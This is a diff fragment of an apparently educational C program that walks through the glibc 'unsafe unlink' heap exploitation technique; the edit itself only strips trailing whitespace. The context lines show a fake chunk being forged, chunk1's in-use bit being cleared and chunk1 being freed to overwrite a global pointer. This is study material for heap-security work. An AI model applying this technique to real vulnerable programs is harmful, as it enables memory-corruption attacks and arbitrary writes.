@@ -22,7 +22,7 @@ int main()
 	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
 	printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
 	printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);
-	
+
 	printf("We create a fake chunk inside chunk0.\n");
 	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
 	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
@@ -40,7 +40,7 @@ int main()
 	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
 	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n");
 	chunk1_hdr[1] &= ~1;
-	
+
 	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
 	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n");
 	free(chunk1_ptr);
